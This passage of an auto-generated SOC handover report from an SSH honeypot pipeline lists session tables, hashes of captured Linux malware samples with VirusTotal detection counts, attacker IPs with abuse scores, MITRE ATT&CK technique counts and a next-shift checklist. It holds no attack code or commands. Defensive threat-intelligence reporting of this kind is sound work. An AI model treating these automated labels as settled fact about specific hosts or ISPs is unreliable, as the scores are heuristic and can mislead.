| `77.72.198[.]224` | 1 | 2026-04-03 02:55 | 2026-04-03 02:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.94.226[.]221` | 1 | 2026-04-03 05:23 | 2026-04-03 05:23 | 31s | 0 | `T1592` | 🟢 LOW |
| `81.30.162[.]19` | 1 | 2026-04-03 03:30 | 2026-04-03 03:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.62.74[.]41` | 1 | 2026-04-03 02:09 | 2026-04-03 02:09 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-04-03 03:44 | 2026-04-03 03:44 | 0s | 3 | `T1110.001` | 🟢 LOW |
| `93.145.118[.]40` | 1 | 2026-04-03 02:35 | 2026-04-03 02:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `93.145.118[.]40` | 1 | 2026-04-03 05:22 | 2026-04-03 05:22 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `211.220.156[.]232` | KR | Korea Telecom | **100** ⚠️ | 29 |
| `104.155.27[.]128` | BE | Google LLC | **100** ⚠️ | 42 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `222.180.2[.]62` | CN | FengDu QiFei WangBa | **100** ⚠️ | 50 |
| `146.255.228[.]189` | GE | SILKNET BROADBAND | **100** ⚠️ | 27 |
| `210.182.73[.]132` | KR | LG DACOM Corporation | **100** ⚠️ | 19 |
| `120.78.9[.]93` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `27.123.98[.]26` | IN | Bharti Airtel Limited | **100** ⚠️ | 18 |
| `81.30.162[.]19` | UA | This is a Vinteleport company Core network, used for | **100** ⚠️ | 33 |
| `181.114.143[.]79` | AR | Cotesma | **100** ⚠️ | 49 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 53 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 34 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (15 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 81 cases |
| Tool 34  | Credential Extractor        | ✅ 43 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 58 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 15 filtered (18.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 42 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 46 recon entry/entries in table (4 group(s) consolidating 17 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-03T05:42:05Z_
